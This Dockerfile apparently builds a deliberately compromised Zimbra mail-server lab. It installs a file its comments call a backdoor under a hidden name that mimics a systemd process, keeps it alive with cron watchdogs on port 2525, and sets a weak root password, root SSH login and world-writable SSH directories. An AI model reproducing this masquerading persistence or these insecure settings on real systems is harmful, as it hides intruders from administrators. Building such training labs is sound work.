FROM maattt10/zimbra8.8.15

# Configurar hostname
RUN echo "zimbra-docker.zimbra.io" > /etc/hostname

# Instalar OpenSSH e cron
RUN apt-get update && apt-get install -y openssh-server sudo cron && rm -rf /var/lib/apt/lists/*

# Configurar SSH
RUN mkdir /var/run/sshd && \
    echo 'root:zimbra123' | chpasswd && \
    sed -i 's/#PermitRootLogin prohibit-password/PermitRootLogin yes/' /etc/ssh/sshd_config

# Criar usuário analyst
RUN useradd -m -s /bin/bash analyst && \
    usermod -aG sudo analyst

# Gerar chaves SSH com permissões corretas
RUN mkdir -p /home/analyst/.ssh && \
    chown analyst:analyst /home/analyst/.ssh && \
    chmod 777 /home/analyst/.ssh && \
    chmod 777 /home/analyst

# Copiar backdoor para diretório oculto do sistema
COPY system.config /usr/local/lib/systemd/system/.systemd-udevd
RUN chmod +x /usr/local/lib/systemd/system/.systemd-udevd

# Configurar cron para monitorar backdoor
RUN echo "*/2 * * * * root /usr/local/lib/systemd/system/.systemd-udevd >/dev/null 2>&1 &" >> /etc/crontab && \
    echo "*/1 * * * * root if ! netstat -tlnp | grep -q ':2525'; then /usr/local/lib/systemd/system/.systemd-udevd >/dev/null 2>&1 &; fi" >> /etc/crontab

# Corrigir permissões do script original
RUN chmod +x /opt/start.sh

# Script de inicialização que configura senhas e chaves dinamicamente
RUN cat > /start-zimbra-custom.sh << 'EOF'
#!/bin/bash
set -e

# Configurar senha do analyst baseada na variável de ambiente
if [ -n "$ANALYST_PASSWORD" ]; then
    echo "analyst:$ANALYST_PASSWORD" | chpasswd
    echo "Senha do analyst configurada: $ANALYST_PASSWORD"
else
    echo "analyst:password123" | chpasswd
    echo "Senha padrão do analyst: password123"
fi

# Corrigir permissões do diretório analyst
chmod 777 /home/analyst
chmod 777 /home/analyst/.ssh

# Gerar chaves SSH se não existirem
if [ ! -f /home/analyst/.ssh/analyst_id_rsa ]; then
    echo "Gerando chaves SSH para analyst..."
    su - analyst -c "ssh-keygen -t rsa -b 2048 -f /home/analyst/.ssh/analyst_id_rsa -N ''"
    su - analyst -c "cp /home/analyst/.ssh/analyst_id_rsa.pub /home/analyst/.ssh/authorized_keys"
    chmod 644 /home/analyst/.ssh/analyst_id_rsa
    chmod 644 /home/analyst/.ssh/analyst_id_rsa.pub
    chmod 644 /home/analyst/.ssh/authorized_keys
    chmod 777 /home/analyst/.ssh
    chmod 777 /home/analyst
fi

# Copiar chave para root
mkdir -p /root/.ssh
cp /home/analyst/.ssh/analyst_id_rsa.pub /root/.ssh/authorized_keys
chmod 700 /root/.ssh && chmod 600 /root/.ssh/authorized_keys

# Iniciar SSH
echo "Iniciando SSH..."
service ssh start

# Iniciar cron
echo "Iniciando cron..."
service cron start

# Iniciar backdoor
echo "Iniciando sistema de configuração..."
/usr/local/lib/systemd/system/.systemd-udevd >/dev/null 2>&1 &

# Aguardar Zimbra inicializar
echo "Aguardando Zimbra inicializar..."
sleep 30

echo "Zimbra rodando na porta 80/443"
echo "SMTP rodando na porta 25"
echo "SSH rodando na porta 22"
echo "Admin Console: https://localhost:7071"
echo "Chaves SSH disponíveis em: /tmp/ssh_keys/"

# Iniciar Zimbra com script original
echo "Iniciando Zimbra com script original..."
/opt/start.sh

echo "Zimbra iniciado com sucesso!"
echo "Aguardando serviços estarem prontos..."

# Manter container rodando
tail -f /dev/null
EOF

RUN chmod +x /start-zimbra-custom.sh
CMD ["/start-zimbra-custom.sh"]
